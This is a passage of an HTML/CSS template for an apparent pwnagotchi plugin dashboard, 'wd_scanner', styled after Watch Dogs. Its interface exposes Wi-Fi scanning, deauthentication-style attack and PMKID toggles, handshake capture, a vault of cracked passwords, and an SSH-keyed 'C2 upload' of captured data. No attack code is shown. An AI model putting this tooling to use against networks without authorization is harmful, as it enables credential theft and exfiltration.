  letter-spacing: .06em;
}}
.passive-picker form {{ margin: 0; }}
.passive-picker .picker-select-row {{
  display: flex;
}}
.passive-picker select {{
  flex: 1 1 auto;
  min-width: 0;
  width: 100%;
  appearance: none; -webkit-appearance: none;
  background: #05080a;
  color: var(--green);
  border: 1px solid var(--green);
  height: 44px;
  padding: 0 32px 0 12px;
  font: inherit;
  letter-spacing: .08em;
  background-image: linear-gradient(45deg, transparent 50%, var(--green) 50%),
                    linear-gradient(135deg, var(--green) 50%, transparent 50%);
  background-position: calc(100% - 18px) 50%, calc(100% - 12px) 50%;
  background-size: 6px 6px, 6px 6px;
  background-repeat: no-repeat;
  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
}}
.passive-picker select:focus {{
  outline: none; border-color: var(--green);
  box-shadow: 0 0 0 2px rgba(43,255,136,.2);
}}
.passive-picker .picker-actions {{
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 8px;
}}
.passive-picker .picker-actions form {{
  display: flex;
  margin: 0;
}}
.passive-picker .picker-actions .btn {{
  flex: 1 1 auto;
  width: 100%;
  height: 44px;
  padding: 0 14px;
  background: #0a1d07;
  color: var(--green);
  border-color: var(--green);
}}
.passive-picker .picker-actions .btn:hover {{
  background: #0f2a0a;
}}
.passive-picker .picker-actions .btn.alt {{
  background: #2a1300;
  color: var(--orange);
  border-color: var(--orange);
}}
.passive-status {{
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 10px;
  padding: 6px 10px;
  background: #04070a;
  border: 1px solid var(--grid);
  font-size: 12px;
}}
.passive-state {{
  padding: 2px 8px;
  font-weight: 700;
  letter-spacing: .2em;
  border: 1px solid;
}}
.passive-state.run {{
  color: var(--green);
  background: rgba(43,255,136,.1);
  border-color: var(--green);
}}
.passive-state.idle {{
  color: var(--mute);
  background: transparent;
  border-color: var(--grid);
}}
.passive-hs {{
  color: var(--cyan);
  letter-spacing: .08em;
}}
.passive-hs b {{
  color: var(--green);
  font-size: 14px;
}}

/* ---- node grid ---- */
.grid {{ display: grid; gap: 10px; }}
.node {{
  position: relative;
  background: linear-gradient(180deg, #0d1318, #0a0d11);
  border: 1px solid var(--grid);
  padding: 12px;
  clip-path: polygon(0 0, calc(100% - 12px) 0, 100% 12px, 100% 100%, 12px 100%, 0 calc(100% - 12px));
}}
.node::before {{
  content: ''; position: absolute; left: 0; top: 0; bottom: 0;
  width: 3px; background: var(--cyan);
  box-shadow: 0 0 10px rgba(0,229,255,.4);
}}
.node-h {{
  display: flex; align-items: center; justify-content: space-between;
  gap: 10px; margin-bottom: 8px;
}}
.ssid {{
  font-size: 16px; font-weight: 700;
  color: var(--fg); word-break: break-all;
  letter-spacing: .04em;
}}
.sig {{ display: inline-flex; align-items: flex-end; gap: 2px; flex: 0 0 auto; }}
.sig i {{
  display: block; width: 4px; background: #1f2a33;
  border: 1px solid #25313b;
}}
.sig i:nth-child(1) {{ height: 6px; }}
.sig i:nth-child(2) {{ height: 10px; }}
.sig i:nth-child(3) {{ height: 14px; }}
.sig i:nth-child(4) {{ height: 18px; }}
.sig.s1 i:nth-child(-n+1),
.sig.s2 i:nth-child(-n+2),
.sig.s3 i:nth-child(-n+3),
.sig.s4 i:nth-child(-n+4) {{
  background: var(--cyan);
  border-color: var(--cyan);
  box-shadow: 0 0 4px rgba(0,229,255,.6);
}}

.meta {{
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 6px 10px;
  margin: 0 0 12px;
}}
.meta > div {{
  display: flex; flex-direction: column;
  border-left: 1px dashed #1f2a33;
  padding: 2px 0 2px 8px;
}}
.meta dt {{
  font-size: 10px; letter-spacing: .25em;
  color: var(--mute); text-transform: uppercase;
}}
.meta dd {{
  margin: 1px 0 0; font-size: 13px;
  color: var(--fg); word-break: break-all;
}}
.meta code {{ color: var(--cyan); font-size: 12px; }}
.cl.hot {{ color: var(--red); text-shadow: 0 0 8px rgba(255,45,85,.5); }}
.cl.warm {{ color: var(--orange); text-shadow: 0 0 8px rgba(255,122,0,.4); }}
.cl.cold {{ color: var(--mute); }}

/* ---- encryption badges ---- */
.enc-wpa3 {{ color: var(--cyan); font-weight: 700; }}
.enc-wpa2 {{ color: var(--green); }}
.enc-wpa {{ color: var(--warn); }}
.enc-wep {{ color: var(--red); }}
.enc-open {{ color: var(--red); font-weight: 700; text-shadow: 0 0 8px rgba(255,45,85,.5); }}

/* ---- pwned state ---- */
.node.pwned {{
  background: linear-gradient(180deg, #0c1d12, #07120a);
  border-color: var(--green);
  box-shadow: 0 0 0 1px rgba(43,255,136,.15), 0 0 18px rgba(43,255,136,.08) inset;
}}
.node.pwned::before {{
  background: var(--green);
  box-shadow: 0 0 12px rgba(43,255,136,.6);
}}
.node.pwned .ssid {{ color: var(--green); text-shadow: 0 0 8px rgba(43,255,136,.4); }}
.badge-pwned {{
  display: inline-block;
  margin-left: 8px;
  padding: 2px 8px;
  font-size: 10px; font-weight: 700;
  letter-spacing: .3em;
  background: var(--green);
  color: #002912;
  border: 1px solid var(--green);
  vertical-align: middle;
  clip-path: polygon(4px 0, 100% 0, calc(100% - 4px) 100%, 0 100%);
  text-shadow: none;
}}
.pw {{
  grid-column: 1 / -1;
  border-left: 2px solid var(--green) !important;
  background: rgba(43,255,136,.05);
  padding: 6px 0 6px 8px !important;
}}
.pw dt {{ color: var(--green) !important; }}
.pw dd {{
  display: flex; align-items: center; gap: 8px;
  flex-wrap: wrap;
}}
.pw .pw-val {{
  color: var(--green) !important;
  font-size: 14px !important;
  font-weight: 700;
  letter-spacing: .04em;
  word-break: break-all;
  text-shadow: 0 0 6px rgba(43,255,136,.4);
}}
.pw .copy {{
  appearance: none; -webkit-appearance: none;
  background: transparent;
  border: 1px solid var(--green);
  color: var(--green);
  font: inherit; font-size: 10px;
  letter-spacing: .25em;
  text-transform: uppercase;
  padding: 4px 8px;
  cursor: pointer;
}}
.pw .copy:active {{ transform: translateY(1px); }}
.pw .copy.ok {{ background: var(--green); color: #002912; }}

/* ---- note row ---- */
.note-row {{
  display: flex; flex-direction: column;
  border-left: 1px dashed #1f2a33;
  padding: 4px 0 4px 8px; margin-top: 8px;
  cursor: pointer;
}}
.note-row dt {{
  font-size: 10px; letter-spacing: .25em;
  color: var(--mute); text-transform: uppercase;
}}
.note-row dd {{
  margin: 2px 0 0; font-size: 12px;
  color: var(--cyan);
}}
.note-row:hover {{
  background: rgba(0,229,255,.05);
}}

/* ---- SSID group (multiple BSSIDs) ---- */
.node-group {{
  border: 1px solid var(--grid);
  background: linear-gradient(180deg, #0b1016, #080b0f);
  padding: 12px;
  clip-path: polygon(0 0, calc(100% - 12px) 0, 100% 12px, 100% 100%, 12px 100%, 0 calc(100% - 12px));
  position: relative;
}}
.node-group::before {{
  content: ''; position: absolute; left: 0; top: 0; bottom: 0;
  width: 3px; background: var(--cyan);
  box-shadow: 0 0 10px rgba(0,229,255,.4);
}}
.node-group.pwned {{
  border-color: var(--green);
  background: linear-gradient(180deg, #091a0f, #060f09);
}}
.node-group.pwned::before {{
  background: var(--green);
  box-shadow: 0 0 12px rgba(43,255,136,.6);
}}
.node-group.pwned .ssid {{ color: var(--green); text-shadow: 0 0 8px rgba(43,255,136,.4); }}
.group-count {{
  font-size: 11px; letter-spacing: .15em; color: var(--mute);
  flex-shrink: 0;
}}
.node-group-items {{
  display: grid; gap: 6px; margin-top: 10px;
  padding-top: 10px; border-top: 1px solid var(--grid);
}}
.node-sub {{
  padding: 8px 10px;
  clip-path: none;
  border-left: 2px solid var(--grid);
  background: rgba(255,255,255,.02);
}}
.node-sub::before {{ display: none; }}
.node-sub.pwned {{
  border-left-color: var(--green);
  background: rgba(43,255,136,.03);
  box-shadow: none;
}}

.node.pwned .btn-hack {{
  background: linear-gradient(180deg, #052618, #021a0e);
  color: var(--green);
  border-color: var(--green);
  text-shadow: 0 0 6px rgba(43,255,136,.4);
  box-shadow: inset 0 0 24px rgba(43,255,136,.06);
}}

/* ---- hack button ---- */
.btn-hack {{
  appearance: none; -webkit-appearance: none;
  width: 100%;
  height: 48px;
  padding: 0 14px;
  font: inherit; font-weight: 700;
  letter-spacing: .25em; text-transform: uppercase;
  background: linear-gradient(180deg, #2a1300, #1a0a00);
  color: var(--orange);
  border: 1px solid var(--orange);
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 10px;
  clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
  text-shadow: 0 0 6px rgba(255,122,0,.6);
  box-shadow: inset 0 0 24px rgba(255,122,0,.08);
}}
.btn-hack:active {{ transform: translateY(1px); }}
.btn-hack[disabled] {{
  opacity: .35; cursor: not-allowed; filter: grayscale(.6);
}}
.btn-hack .glyph {{ font-size: 18px; }}

/* ---- empty + log ---- */
.empty {{
  text-align: center; padding: 40px 12px;
  border: 1px dashed var(--grid); color: var(--mute);
}}
.empty-glyph {{ font-size: 42px; color: var(--cyan); opacity: .6; }}
.empty p {{ margin: 8px 0 4px; letter-spacing: .25em; color: var(--fg); }}
.empty small {{ letter-spacing: .15em; }}

.section-h {{
  margin: 18px 0 8px;
  font-size: 11px; letter-spacing: .3em;
  color: var(--mute); text-transform: uppercase;
  display: flex; align-items: center; gap: 8px;
}}
.section-h::before, .section-h::after {{
  content: ''; flex: 1; height: 1px; background: var(--grid);
}}
.section-h.collapsible {{
  cursor: pointer; -webkit-tap-highlight-color: transparent;
}}
.section-h.collapsible:active {{ color: var(--cyan); }}
.collapse-arrow {{
  display: inline-block; transition: transform .2s ease;
  font-size: 9px;
}}
.section-h.collapsed .collapse-arrow {{
  transform: rotate(-90deg);
}}
.grid.collapsed {{
  display: none;
}}
/* Per-SSID collapse */
.ssid-toggle {{
  cursor: pointer; -webkit-tap-highlight-color: transparent;
}}
.ssid-toggle:active {{ color: var(--cyan); }}
.ssid-toggle.collapsed .collapse-arrow {{
  transform: rotate(-90deg);
}}
.node.ssid-collapsed > .node-body,
.node-group.ssid-collapsed > .node-body {{
  display: none;
}}
.log {{
  margin: 0;
  background: #04070a;
  color: #b5e6ee;
  border: 1px solid var(--grid);
  padding: 10px 12px;
  font-size: 12px; line-height: 1.5;
  max-height: 240px; overflow: auto;
  white-space: pre-wrap; word-break: break-all;
}}
.log:empty::before {{ content: '// silence'; color: var(--mute); }}

/* ---- update panel ---- */
.upd {{
  margin: 14px 0 0;
  padding: 12px;
  background: linear-gradient(180deg, #0a1418, #07090b);
  border: 1px solid var(--grid);
  clip-path: polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
  position: relative;
}}
.upd::before {{
  content: ''; position: absolute; left: 0; top: 0; bottom: 0;
  width: 3px; background: var(--cyan-d);
  box-shadow: 0 0 10px rgba(0,184,204,.3);
}}
.upd h3 {{
  margin: 0 0 8px; font-size: 11px; letter-spacing: .3em;
  color: var(--mute); text-transform: uppercase;
}}
.upd-grid {{
  display: grid; gap: 6px 12px;
  grid-template-columns: 1fr 1fr;
  margin-bottom: 10px;
}}
.upd-grid > div {{ display: flex; flex-direction: column; }}
.upd-grid dt {{ font-size: 10px; letter-spacing: .25em; color: var(--mute); text-transform: uppercase; }}
.upd-grid dd {{ margin: 1px 0 0; color: var(--fg); word-break: break-all; }}
.upd-actions {{ display: flex; gap: 8px; flex-wrap: wrap; }}
.upd-actions form {{ flex: 1; min-width: 140px; }}
.upd-actions .btn {{ width: 100%; }}
.upd .ok {{ color: var(--green); }}
.upd .warn {{ color: var(--orange); }}
.upd .bad {{ color: var(--red); }}
.upd .pending {{ color: var(--cyan); }}
.upd .mute {{ color: var(--mute); font-size: 11px; }}

/* ---- shotgun ---- */
.shotgun {{
  margin: 0 0 12px; padding: 10px 12px;
  border: 1px solid var(--orange);
  background: linear-gradient(180deg, rgba(255,122,0,.06), transparent);
  clip-path: polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
  position: relative;
}}
.shotgun::before {{
  content: ''; position: absolute; left: 0; top: 0; bottom: 0;
  width: 3px; background: var(--orange); box-shadow: 0 0 10px rgba(255,122,0,.5);
}}
.shotgun h3 {{
  margin: 0 0 4px; font-size: 11px; letter-spacing: .3em;
  text-transform: uppercase; color: var(--orange);
}}
.shotgun .shot-blurb {{
  margin: 0 0 8px; color: var(--mute); font-size: 11px; letter-spacing: .12em;
}}
.shot-chips {{ display: flex; flex-wrap: wrap; gap: 6px; }}
.shot-chip-form {{ margin: 0; }}
.shot-chip {{
  appearance: none; -webkit-appearance: none;
  font: inherit; font-weight: 700;
  letter-spacing: .15em; text-transform: uppercase;
  background: #2a1300; color: var(--orange);
  border: 1px solid var(--orange);
  padding: 6px 12px; min-height: 36px;
  cursor: pointer;
  display: inline-flex; align-items: center; gap: 6px;
  clip-path: polygon(6px 0, 100% 0, 100% calc(100% - 6px), calc(100% - 6px) 100%, 0 100%, 0 6px);
}}
.shot-chip:active {{ transform: translateY(1px); }}
.shot-chip[disabled] {{ opacity: .4; cursor: not-allowed; }}
.shot-chip .shot-n {{
  background: var(--orange); color: #1a0a00;
  padding: 0 6px; font-size: 10px; font-weight: 700;
  letter-spacing: .12em;
}}

/* ---- recon button on cards ---- */
.recon-form {{ margin-top: 8px; }}
.btn-recon {{
  appearance: none; -webkit-appearance: none;
  width: 100%;
  height: 44px;
  padding: 0 14px;
  font: inherit; font-weight: 700;
  letter-spacing: .25em; text-transform: uppercase;
  background: linear-gradient(180deg, #00282e, #001416);
  color: var(--cyan);
  border: 1px solid var(--cyan);
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 10px;
  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
  text-shadow: 0 0 6px rgba(0,229,255,.5);
}}
.btn-recon:active {{ transform: translateY(1px); }}
.btn-recon[disabled] {{ opacity: .35; cursor: not-allowed; filter: grayscale(.6); }}
.btn-recon .glyph {{ font-size: 16px; }}

/* ---- recon panel ---- */
.recon-panel {{
  border: 1px solid var(--cyan-d);
  background: linear-gradient(180deg, #04161a, #07090b);
  padding: 10px 12px;
  margin-bottom: 12px;
  clip-path: polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
}}
.recon-h {{
  display: flex; align-items: center; justify-content: space-between;
  gap: 10px; margin-bottom: 8px;
}}
.recon-h a {{
  color: var(--cyan); text-decoration: none;
  font-size: 11px; letter-spacing: .25em; text-transform: uppercase;
  border: 1px solid var(--cyan); padding: 4px 10px;
}}
.recon-state {{
  font-size: 11px; letter-spacing: .25em; padding: 2px 8px;
  border: 1px solid var(--grid);
}}
.recon-state.run {{
  color: var(--green); border-color: var(--green);
  text-shadow: 0 0 6px rgba(43,255,136,.5);
}}
.recon-state.idle {{ color: var(--mute); }}

.nav .count.cyan {{
  background: var(--cyan); color: #002a30;
}}

.restart-banner {{
  margin: 0 0 10px;
  padding: 10px 12px;
  background: linear-gradient(90deg, rgba(255,122,0,.15), rgba(255,122,0,.04));
  border: 1px solid var(--orange);
  color: var(--orange);
  font-size: 12px;
  letter-spacing: .15em;
  text-transform: uppercase;
  display: flex; align-items: center; gap: 10px;
  animation: pulse 1.6s ease-in-out infinite alternate;
}}
.restart-banner b {{ color: #fff; text-shadow: 0 0 6px rgba(255,122,0,.6); }}
@keyframes pulse {{
  from {{ box-shadow: 0 0 0 rgba(255,122,0,0); }}
  to   {{ box-shadow: 0 0 18px rgba(255,122,0,.4); }}
}}

footer.tag {{
  margin: 16px 0 8px;
  text-align: center;
  color: var(--mute);
  font-size: 10px; letter-spacing: .35em;
}}

/* ---- handshake toast notification ---- */
.toast {{
  display: none;
  position: fixed; bottom: 16px; left: 12px; right: 12px;
  max-width: 400px; margin: 0 auto;
  padding: 14px 16px;
  background: linear-gradient(135deg, #0a2e0a, #0d1f0d);
  border: 1px solid var(--green);
  color: var(--green);
  font: inherit; font-size: 13px; letter-spacing: .1em;
  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
  z-index: 100;
  box-shadow: 0 0 24px rgba(43,255,136,.25);
  animation: toast-pulse .8s ease-in-out infinite alternate;
}}
.toast.visible {{ display: flex; align-items: center; gap: 10px; }}
.toast .toast-msg {{ flex: 1; }}
.toast .toast-dismiss {{
  appearance: none; -webkit-appearance: none;
  background: transparent; border: 1px solid var(--green); color: var(--green);
  font: inherit; font-size: 11px; letter-spacing: .15em;
  padding: 6px 12px; cursor: pointer;
  clip-path: polygon(4px 0, 100% 0, 100% calc(100% - 4px), calc(100% - 4px) 100%, 0 100%, 0 4px);
}}
.toast .toast-dismiss:active {{ background: rgba(43,255,136,.15); }}
@keyframes toast-pulse {{
  from {{ box-shadow: 0 0 10px rgba(43,255,136,.15); }}
  to   {{ box-shadow: 0 0 24px rgba(43,255,136,.4); }}
}}

/* ---- terminal popup ---- */
.terminal-overlay {{
  display: none;
  position: fixed; inset: 0; z-index: 200;
  background: rgba(0,0,0,.85);
  backdrop-filter: blur(4px);
  align-items: center; justify-content: center;
  padding: 16px;
}}
.terminal-overlay.visible {{ display: flex; }}
.terminal-box {{
  width: 100%; max-width: 800px; max-height: 90vh;
  background: linear-gradient(180deg, #0a0e12, #070a0d);
  border: 2px solid var(--cyan);
  clip-path: polygon(12px 0, 100% 0, 100% calc(100% - 12px), calc(100% - 12px) 100%, 0 100%, 0 12px);
  display: flex; flex-direction: column;
  box-shadow: 0 0 40px rgba(0,229,255,.3), inset 0 0 40px rgba(0,229,255,.05);
}}
.terminal-header {{
  display: flex; align-items: center; justify-content: space-between;
  padding: 12px 16px;
  border-bottom: 1px solid var(--cyan-d);
  background: rgba(0,229,255,.05);
}}
.terminal-title {{
  display: flex; align-items: center; gap: 8px;
  color: var(--cyan);
  font-weight: 700; font-size: 13px;
  letter-spacing: .2em; text-transform: uppercase;
}}
.terminal-title::before {{
  content: '▸';
  font-size: 16px;
  animation: terminal-blink 1s steps(2) infinite;
}}
@keyframes terminal-blink {{
  0%, 49% {{ opacity: 1; }}
  50%, 100% {{ opacity: .3; }}
}}
.terminal-close {{
  appearance: none; -webkit-appearance: none;
  background: transparent; border: 1px solid var(--red);
  color: var(--red);
  font: inherit; font-size: 11px; font-weight: 700;
  letter-spacing: .15em;
  padding: 6px 12px; cursor: pointer;
  clip-path: polygon(4px 0, 100% 0, 100% calc(100% - 4px), calc(100% - 4px) 100%, 0 100%, 0 4px);
  transition: background .12s;
}}
.terminal-close:hover {{ background: rgba(255,45,85,.15); }}
.terminal-close:active {{ background: rgba(255,45,85,.25); }}
.terminal-output {{
  flex: 1;
  overflow-y: auto;
  padding: 12px 16px;
  font-family: ui-monospace, "JetBrains Mono", "Fira Code", Menlo, Consolas, monospace;
  font-size: 12px;
  line-height: 1.6;
  color: var(--green);
  background: rgba(0,0,0,.4);
}}
.terminal-output::-webkit-scrollbar {{ width: 8px; }}
.terminal-output::-webkit-scrollbar-track {{ background: rgba(0,0,0,.3); }}
.terminal-output::-webkit-scrollbar-thumb {{
  background: var(--cyan-d);
  border-radius: 4px;
}}
.terminal-output::-webkit-scrollbar-thumb:hover {{ background: var(--cyan); }}
.terminal-line {{
  margin-bottom: 4px;
  white-space: pre-wrap;
  word-break: break-word;
}}
.terminal-line.warn {{ color: var(--warn); }}
.terminal-line.error {{ color: var(--red); }}
.terminal-line.info {{ color: var(--cyan); }}

/* ---- controls panel ---- */
.controls-panel {{
  display: flex; gap: 8px; flex-wrap: wrap;
  padding: 8px 12px; margin: 0 -12px 12px;
  background: rgba(13,17,21,.6);
  border-bottom: 1px solid var(--grid);
}}
.toggle-btn {{
  appearance: none; -webkit-appearance: none;
  background: var(--panel); border: 1px solid var(--grid);
  color: var(--mute); font: inherit; font-size: 11px;
  letter-spacing: .15em; text-transform: uppercase;
  padding: 8px 12px; cursor: pointer;
  transition: all .12s;
}}
.toggle-btn:hover {{ background: var(--grid); }}
.toggle-btn:active {{ transform: translateY(1px); }}
.toggle-btn span {{ color: var(--cyan); font-weight: 700; }}

/* ---- modal dialogs ---- */
.modal-overlay {{
  display: none;
  position: fixed; inset: 0; z-index: 300;
  background: rgba(0,0,0,.9);
  backdrop-filter: blur(6px);
  align-items: center; justify-content: center;
  padding: 16px;
}}
.modal-overlay.visible {{ display: flex; }}
.modal-box {{
  width: 100%; max-width: 600px; max-height: 90vh;
  background: linear-gradient(180deg, #0e141a, #0a0e12);
  border: 2px solid var(--orange);
  clip-path: polygon(12px 0, 100% 0, 100% calc(100% - 12px), calc(100% - 12px) 100%, 0 100%, 0 12px);
  display: flex; flex-direction: column;
  box-shadow: 0 0 40px rgba(255,122,0,.3);
}}
.modal-header {{
  display: flex; align-items: center; justify-content: space-between;
  padding: 12px 16px;
  border-bottom: 1px solid var(--orange);
  background: rgba(255,122,0,.05);
}}
.modal-title {{
  color: var(--orange); font-weight: 700; font-size: 13px;
  letter-spacing: .2em; text-transform: uppercase;
}}
.modal-close {{
  appearance: none; -webkit-appearance: none;
  background: transparent; border: 1px solid var(--orange);
  color: var(--orange);
  font: inherit; font-size: 11px; font-weight: 700;
  letter-spacing: .15em; padding: 6px 12px; cursor: pointer;
  clip-path: polygon(4px 0, 100% 0, 100% calc(100% - 4px), calc(100% - 4px) 100%, 0 100%, 0 4px);
  transition: background .12s;
}}
.modal-close:hover {{ background: rgba(255,122,0,.15); }}
.modal-close:active {{ background: rgba(255,122,0,.25); }}
.modal-body {{
  padding: 16px;
  overflow-y: auto;
}}
.modal-body label {{
  display: block; margin-bottom: 12px;
  color: var(--fg); font-size: 12px;
  letter-spacing: .1em; text-transform: uppercase;
}}
.modal-body input[type=text],
.modal-body input[type=number],
.modal-body textarea {{
  width: 100%; margin-top: 4px;
  background: #05080a; border: 1px solid var(--grid);
  color: var(--cyan); padding: 8px;
  font: inherit; font-size: 13px;
}}
.modal-body textarea {{
  font-family: ui-monospace, monospace;
  resize: vertical;
}}
.modal-body input:focus,
.modal-body textarea:focus {{
  outline: none; border-color: var(--orange);
  box-shadow: 0 0 0 2px rgba(255,122,0,.2);
}}
.modal-body .btn {{
  width: 100%; margin-top: 16px;
}}
.modal-hint {{
  background: rgba(255,122,0,.1); border-left: 3px solid var(--orange);
  padding: 8px 12px; margin-bottom: 16px;
  font-size: 12px; color: var(--fg);
}}

/* ---- larger phones / small tablets ---- */
@media (min-width: 560px) {{
  body {{ font-size: 15px; }}
  .meta {{ grid-template-columns: repeat(4, 1fr); }}
  .status {{ grid-template-columns: repeat(4, 1fr); }}
}}

/* ---- glitch on the brand title ---- */
.brand h1 {{
  position: relative;
}}
.brand h1::after {{
  content: attr(data-text);
  position: absolute; left: 0; top: 0;
  color: var(--cyan); opacity: .35;
  transform: translate(1px, -1px);
  pointer-events: none;
  mix-blend-mode: screen;
}}

/* ---- nav ---- */
.nav {{
  display: flex; gap: 8px; margin: 0 0 12px; flex-wrap: wrap;
}}
.nav a {{
  flex: 1; min-width: 120px;
  display: inline-flex; align-items: center; justify-content: center;
  height: 36px; padding: 0 12px;
  font: inherit; font-weight: 700; letter-spacing: .2em; text-transform: uppercase;
  background: transparent; color: var(--cyan);
  border: 1px solid var(--grid);
  text-decoration: none;
  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
}}
.nav a.active {{ border-color: var(--cyan); background: #06292e; }}
.nav .count {{
  display: inline-block; padding: 1px 6px; margin-left: 6px;
  background: var(--green); color: #002912;
  font-weight: 700; font-size: 10px; letter-spacing: .15em;
}}

/* ---- shared-radio badge ---- */
.shared-warn {{
  margin: 0 0 10px; padding: 8px 10px;
  background: rgba(255,179,0,.06);
  border: 1px solid var(--warn); color: var(--warn);
  font-size: 12px; letter-spacing: .08em;
  display: flex; align-items: center; gap: 8px;
}}
.shared-warn b {{ color: #fff; }}
option[data-role='shared'] {{ color: var(--warn) !important; }}
</style>
</head>
<body>
<div class='wrap'>

  <div class='brand'>
    <div class='mark'>&#x2620;</div>
    <h1 data-text='ctOS // wd_scanner'>ct<b>OS</b> // wd_scanner</h1>
    <span class='sub'>DedSec</span>
  </div>

  <nav class='nav'>
    <a href='/plugins/wd_scanner/' class='active'>SCANNER</a>
    <a href='/plugins/wd_scanner/pwned'>VAULT <span class='count'>{pwned_count}</span></a>
    <a href='/plugins/wd_scanner/recon'>RECON <span class='count cyan'>{recon_count}</span></a>
    <a href='/plugins/wd_scanner/plunder'>PLUNDER <span class='count'>{plunder_count}</span></a>
  </nav>

  <div class='status' id='wd-status'>
    <div class='chip'><span class='k'>aux iface</span><span class='v'>{iface}</span></div>
    <div class='chip'><span class='k'>monitor</span><span class='v'>{mon}</span></div>
    <div class='chip {scan_cls}'><span class='k'>scan</span><span class='v'>{scan_state}</span></div>
    <div class='chip {atk_cls}'><span class='k'>attack</span><span class='v'>{attack_state}</span></div>
  </div>

  <div class='picker'>
    <form method='POST' action='/plugins/wd_scanner/select' id='picker-form'>
      {csrf}
      <div class='picker-select-row'>
        <select name='interface' aria-label='auxiliary radio' {pick_disabled}>
          {options}
        </select>
      </div>
    </form>
    <div class='picker-actions'>
      <button type='submit' form='picker-form' class='btn' {pick_disabled}>
        &#9711; SELECT
      </button>
      <form method='POST' action='/plugins/wd_scanner/release'>
        {csrf}
        <button type='submit' class='btn alt' {release_disabled}>&#10005; RELEASE</button>
      </form>
    </div>
  </div>
  {select_err}
  {select_hint}
  {shared_warn}

  <div class='passive-picker'>
    <h3>passive monitor (3rd radio)</h3>
    <p class='passive-blurb'>continuous all-channel capture → handshakes auto-fed to pwnagotchi</p>
    <form method='POST' action='/plugins/wd_scanner/select_passive' id='passive-picker-form'>
      {csrf}
      <div class='picker-select-row'>
        <select name='interface' aria-label='passive monitor radio'>
          {passive_options}
        </select>
      </div>
    </form>
    <div class='picker-actions'>
      <button type='submit' form='passive-picker-form' class='btn'>&#9711; SELECT PASSIVE</button>
      <form method='POST' action='/plugins/wd_scanner/release_passive'>
        {csrf}
        <button type='submit' class='btn alt'>&#10005; RELEASE</button>
      </form>
    </div>
    <div class='passive-status' id='passive-status'>
      <span class='passive-state {passive_state_cls}'>{passive_state_text}</span>
      <span class='passive-hs'>handshakes: <b>{passive_hs}</b></span>
    </div>
  </div>
  {restart_banner}

  <div class='toolbar'>
    <form method='POST' action='/plugins/wd_scanner/scan'>
      {csrf}
      <label class='scan-dur'><input type='number' name='seconds' value='{secs}' min='5' max='300' inputmode='numeric' aria-label='scan seconds'><span class='scan-dur-unit'>sec</span></label>
      <button type='submit' class='btn' {scan_disabled}>&#9678; SCAN</button>
    </form>
  </div>

  <div class='controls-panel'>
    <button class='toggle-btn' id='toggle-pmkid' {pmkid_disabled}>PMKID: <span id='pmkid-state'>{pmkid_state}</span></button>
    <button class='toggle-btn' id='toggle-auto-attack'>AUTO: <span id='auto-attack-state'>{auto_attack_state}</span></button>
    <button class='toggle-btn' id='toggle-debug'>DEBUG: <span id='debug-state'>{debug_state}</span></button>
    <button class='toggle-btn' id='show-filters'>FILTERS</button>
    <button class='toggle-btn' id='show-c2'>C2 UPLOAD</button>
  </div>

  <div id='wd-shotgun'>{shotgun_panel}</div>

  <div class='section-h collapsible' id='wd-grid-toggle'>
    <span class='collapse-arrow'>&#x25BC;</span> nodes detected
  </div>
  <div class='grid' id='wd-grid'>
    {cards}
  </div>

  <div class='section-h collapsible' id='wd-log-toggle'>
    <span class='collapse-arrow'>&#x25BC;</span> action log
  </div>
  <pre class='log' id='wd-log'>{log}</pre>

  <div id='wd-recon'>{recon_panel}</div>

  {update_panel}

  <footer class='tag'>// the truth will set us free //</footer>
</div>

<div class='toast' id='wd-toast'>
  <span class='toast-msg' id='wd-toast-msg'></span>
  <button class='toast-dismiss' id='wd-toast-dismiss'>DISMISS</button>
</div>

<div class='terminal-overlay' id='terminal-overlay'>
  <div class='terminal-box'>
    <div class='terminal-header'>
      <div class='terminal-title' id='terminal-title'>OPERATION IN PROGRESS</div>
      <button class='terminal-close' id='terminal-close'>CLOSE</button>
    </div>
    <div class='terminal-output' id='terminal-output'></div>
  </div>
</div>

<div class='modal-overlay' id='filter-modal'>
  <div class='modal-box'>
    <div class='modal-header'>
      <div class='modal-title'>TARGET FILTERS</div>
      <button class='modal-close' data-modal='filter-modal'>CLOSE</button>
    </div>
    <div class='modal-body'>
      <label>Min Signal (dBm): <input type='number' id='filter-signal' value='-100' min='-100' max='0'></label>
      <label>Min Clients: <input type='number' id='filter-clients' value='0' min='0' max='100'></label>
      <label>Security Type: <input type='text' id='filter-security' placeholder='WPA2,WPA3 (empty = all)'></label>
      <label><input type='checkbox' id='filter-hide-pwned'> Hide Pwned Networks</label>
      <button class='btn' id='apply-filters'>APPLY FILTERS</button>
    </div>
  </div>
</div>

<div class='modal-overlay' id='c2-modal'>
  <div class='modal-box'>
    <div class='modal-header'>
      <div class='modal-title'>C2 UPLOAD</div>
      <button class='modal-close' data-modal='c2-modal'>CLOSE</button>
    </div>
    <div class='modal-body'>
      <p class='modal-hint'>Upload data to C2 server. SSH key is NOT saved to disk.</p>
      <label>C2 Host: <input type='text' id='c2-host' value='{c2_host}' placeholder='user@host:port' disabled></label>
      <label>SSH Private Key (PEM):<textarea id='c2-key' rows='8' placeholder='-----BEGIN RSA PRIVATE KEY-----&#10;...'></textarea></label>
      <label>Target BSSID (optional): <input type='text' id='c2-bssid' placeholder='empty = upload all'></label>
      <button class='btn' id='start-c2-upload'>START UPLOAD</button>
    </div>
  </div>
</div>

<script>
(function () {{
  // ---- Note editing ----
  document.addEventListener('click', function (ev) {{
